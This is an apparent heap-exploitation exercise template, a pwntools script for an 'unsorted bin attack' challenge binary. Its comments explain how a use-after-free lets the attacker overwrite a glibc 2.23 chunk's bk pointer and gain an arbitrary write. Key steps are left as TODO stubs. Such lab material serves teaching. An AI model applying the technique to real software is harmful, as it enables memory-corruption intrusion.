'''
Unsorted Bin Attack Challenge solution
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'magic_value'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.23/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil("Welcome").replace("Welcome","") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", string)
	return 

def trigger_bug():
	###########################
	# SETUP ###################
	###########################
	''' 
	Instead of settting the ptr to zero in the lst, it just 
	decrements the counter for the size. 

	So, if we free a 'string' that is not at the top of the list
	there is a 'use after free' that is created. 

	We allocate two 'strings' and free index 0. Now, there is a
	UAF on the 0th index. 
	'''

	## Create a use after free
	# TODO: Use 'create_string and 'delete_string' for UAF
	pass 

	return 0 

def unsorted_bin_attack(index): 
	'''
	The 0th index is accessible even though the chunk has already been 
	freed. This chunk is currently in the unsorted bin. 

	Unsorted bin chunks look like the following: 
	- prev_size 
	- size 
	- forward ptr 
	- back ptr
	'''

	''' 
	Line 3472 is where the bk pointer from the chunk is being accessed.
	It is doing the following: 
		bck = unsorted_bin_chunk->bk; // We control bk, therefore, bck!

	Source: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3477

	Next, the location of bck->fd is written to. This looks like the 
	following: 	
		bck->fd = large_value; 
		
	Source: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3517.
	

	The bk ptrs fd ptr of the unsorted bin chunk is being 
	written to at a very large value (the location of the bin, to be 
	precise) and we control the bck ptr! This allows for an 
	arbitrary WRITE-WHERE primitive. 

	So, if we set the location of 'magic' to be the bck ptr, then 
	we can write a large value here!

	Although, there is one small trick here... bck->fd is actually
	the following: 
		bck+0x10 = large_value

	In order to write to the magic vlaue, we need to write to 'magic address' - 0x10 
	in order to account for the 'fd' struct offset. 
	'''

	pass 

	##########################
	#### Create Fake Chunk ###
	##########################
	print("Fake chunk add 'fd' of unsorted bin chunk with garbage")
	fake_data = b"A" * 8 # Fd of unsorted bin chunk. Does not matter what the value is
	
	print("Fake chunk add 'bk' pointer with 'magic' address - 0x10")
	fake_data += "B" # TODO: Edit with proper address of target 

	print("Overwrite 'fd' and 'bk' of unsorted bin chunk")
	edit_string(index, fake_data) # Edit the actual that has the UAF on it.

'''
Trigger the unsorted bin to be used
'''
def trigger():
	''' 
	This actually triggers the code being ran for the unsorted bin attack. 
	This happens when an allocation reaches the unsorted_bin processing. 
	'''
	pass

# Location of the magic value in memory
magic_loc = elf.symbols['magic']

# Trigger the vulnerability. 
# Creates a UAF on index.
UAF_index = trigger_bug() 

# Setup the unsorted bin attack 'bk' overwrite
unsorted_bin_attack(UAF_index) 

# Hit the unsorted bin attack 
trigger()

print("Check to see if the value has changed!")
# Check to see if the 'magic' value has been altered
p.sendlineafter(">", "1337") 
p.interactive()


